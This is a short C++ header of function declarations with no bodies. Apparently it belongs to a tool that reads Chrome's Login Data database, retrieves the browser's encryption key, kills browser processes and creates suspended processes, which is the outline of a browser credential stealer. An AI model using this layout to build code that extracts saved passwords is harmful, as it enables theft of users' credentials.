#ifndef HELPER_H
#define HELPER_H

#include "includes\Imports.h"
#include "includes\Definitions.h"

sqlite3_stmt* query_database(std::string target_login_data, const char* database_query);
BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile);
BOOL kill_process(std::string process_path);
std::string GetBrowserProcessName(const std::string& browserFolder);

DWORD Enumeration(const wchar_t* proc_name);
std::string retrieve_chrome_key();
std::string readFileContent(const std::string& filename);
DWORD CreateSuspendedProcess(LPCWSTR applicationPath);

#endif /* HELPER_H */#pragma once
